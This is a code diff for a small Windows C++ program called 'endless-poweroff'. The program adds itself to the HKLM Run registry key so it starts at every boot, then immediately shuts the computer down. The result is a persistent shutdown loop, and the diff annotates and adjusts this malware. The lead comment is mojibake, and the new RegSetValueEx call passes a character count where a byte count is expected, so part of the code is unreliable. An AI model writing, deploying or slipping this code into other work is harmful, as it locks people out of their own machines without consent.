@@ -1,4 +1,4 @@
-// endless-poweroff.cpp : ∂®“Âøÿ÷∆Ã®”¶”√≥Ã–Úµƒ»Îø⁄µ„°£
+// endless-poweroff.cpp : ÂÆö‰πâÊéßÂà∂Âè∞Â∫îÁî®Á®ãÂ∫èÁöÑÂÖ•Âè£ÁÇπ„ÄÇ
 //
 
 #include "stdafx.h"
@@ -8,7 +8,7 @@
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
-//using namespace std;
+
 BOOL MySystemShutdown()
 {
 	HANDLE hToken;
@@ -50,13 +50,19 @@ BOOL MySystemShutdown()
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	HKEY hKey = { 0 };
-	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-	char sz_path_c[MAXBYTE] = { 0 };
-	GetModuleFileNameA(nullptr,sz_path_c,MAXBYTE);
-	RegSetValueExA(hKey, "endlesspoweroff", 0, REG_SZ, (BYTE*)sz_path_c, strlen(sz_path_c));
-
-	//system("pause");
+	HKEY hKey = { 0 };//Get a handle to an open registry key. 
+	LPCTSTR path = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";//The registry subkey to be opened.
+	//Opens the specified registry key.
+	//If the system is 64bits ,please introduce a paramete of KEY_WOW64_64KEY .
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE|KEY_WOW64_64KEY, &hKey);
+	
+	TCHAR sz_path_c[MAX_PATH];
+	//Retrieves the fully qualified path for the file that contains the specified module.
+	GetModuleFileName(nullptr,sz_path_c,MAX_PATH);
+	//Sets the data and type of the sz_path_c under a registry key.
+	RegSetValueEx(hKey, L"endlesspoweroff", 0, REG_SZ, (BYTE*)sz_path_c, lstrlen(sz_path_c));
+	//Closes the handle to the specified registry key.
+	RegCloseKey(hKey);
 	MySystemShutdown();
     return 0;
 }
